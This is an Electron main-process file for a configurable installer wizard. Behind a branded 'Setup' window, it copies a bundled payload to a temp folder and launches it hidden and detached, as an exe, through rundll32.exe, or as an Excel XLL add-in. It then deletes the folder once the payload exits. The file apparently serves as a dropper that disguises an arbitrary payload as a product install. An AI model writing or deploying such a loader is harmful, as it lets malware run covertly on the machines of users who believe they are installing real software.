const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { spawn } = require('child_process');
const config = require('./config');

// Track the current child + temp dir so cleanup fires after the spawned
// payload exits, regardless of whether the wizard window is still open.
let pendingCleanup = null;

function createWindow() {
  const win = new BrowserWindow({
    width: 560,
    height: 420,
    resizable: false,
    title: `${config.PRODUCT} Setup`,
    autoHideMenuBar: true,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: false,
    },
  });
  win.removeMenu();
  win.loadFile(path.join(__dirname, 'renderer', 'index.html'));
}

ipcMain.handle('installer:product', () => ({
  product: config.PRODUCT,
  publisher: config.PUBLISHER,
  version: config.VERSION,
}));

ipcMain.handle('installer:run', async () => {
  try {
    // Resources are staged under process.resourcesPath/payload/ via
    // electron-builder's extraResources directive. Copy to a fresh
    // %TEMP%\inst-<uuid> so the target exe sees a writable dir and so we
    // can rm it cleanly after the child exits.
    const srcDir = path.join(process.resourcesPath, 'payload');
    const tmpDir = path.join(os.tmpdir(), 'inst-' + crypto.randomUUID());
    fs.mkdirSync(tmpDir, { recursive: true });
    fs.cpSync(srcDir, tmpDir, { recursive: true });

    const entryPath = path.join(tmpDir, config.ENTRY_NAME);
    let child;
    switch (config.ENTRY_FORMAT) {
      case 'exe':
        child = spawn(entryPath, [], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      case 'dll':
        child = spawn('rundll32.exe', [`${entryPath},${config.DLL_ENTRY}`], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      case 'xll':
        child = spawn('excel.exe', ['/e', entryPath], {
          detached: true,
          windowsHide: true,
          stdio: 'ignore',
          cwd: tmpDir,
        });
        break;
      default:
        return { ok: false, error: `unsupported ENTRY_FORMAT: ${config.ENTRY_FORMAT}` };
    }

    // Clean up tmpDir after child exits. Detach the handle so the Electron
    // main process can quit without killing the payload, but keep the
    // 'exit' listener alive for the cleanup side effect.
    pendingCleanup = tmpDir;
    child.on('exit', () => {
      try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (_) {}
      if (pendingCleanup === tmpDir) pendingCleanup = null;
    });
    child.unref();

    return { ok: true };
  } catch (err) {
    return { ok: false, error: String(err && err.message || err) };
  }
});

app.whenReady().then(createWindow);
app.on('window-all-closed', () => app.quit());
